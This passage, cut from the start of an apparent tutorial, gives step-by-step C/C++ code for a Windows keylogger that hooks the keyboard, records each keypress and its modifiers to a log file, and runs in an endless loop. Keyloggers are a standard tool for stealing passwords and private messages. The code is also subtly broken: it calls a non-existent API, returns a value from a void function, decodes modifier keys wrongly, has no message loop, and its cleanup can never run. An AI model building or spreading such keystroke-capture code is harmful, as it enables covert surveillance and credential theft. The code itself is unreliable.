#include <io.h>
#include <iostream>
#include <ctime>
#include <string>
```

### Step 2: Define the Keyboard Hook Function

Define a function to handle keyboard events:

```c
using namespace std;

HHOOK keyboardHook;
bool isRecording = true;

void keyboardCallback(int nCode, int wParam, int lParam) {
    if (!isRecording) return;

    if (wParam == WM_KEYDOWN) {
        // Key is pressed
        bool isShift = (lParam & 0x0200) != 0;
        bool isCtrl = (lParam & 0x0100) != 0;
        bool isAlt = (lParam & 0x0400) != 0;

        char key = GetKeyName(nCode);
        if (key != NULL) {
            string keystroke = key;
            if (isShift) keystroke += "Shift";
            if (isCtrl) keystroke += "Ctrl";
            if (isAlt) keystroke += "Alt";
            // Append keystroke to your log file
            append_to_file(keystroke + "\n");
        }
    } else if (wParam == WM_KEYUP) {
        // Key is released
        // Optionally handle key release, but not necessary for logging
    }

    return keyboardHook;
}
```

### Step 3: Set Up the Keyboard Hook

Initialize and set up the keyboard hook:

```c
int main() {
    char filename[] = "keystroke.log";
    FILE *file = fopen(filename, "a");

    SetWindowsHook(WH_KEYBOARD, keyboardCallback);

    cout << "Keyboard hook initialized. Logging to " << filename << endl;

    while (true) {
        Sleep(1);
    }

    // Unhook and clean up
    UnhookWindowsHook(keyboardHook);
    fclose(file);
    return 0;
}
```

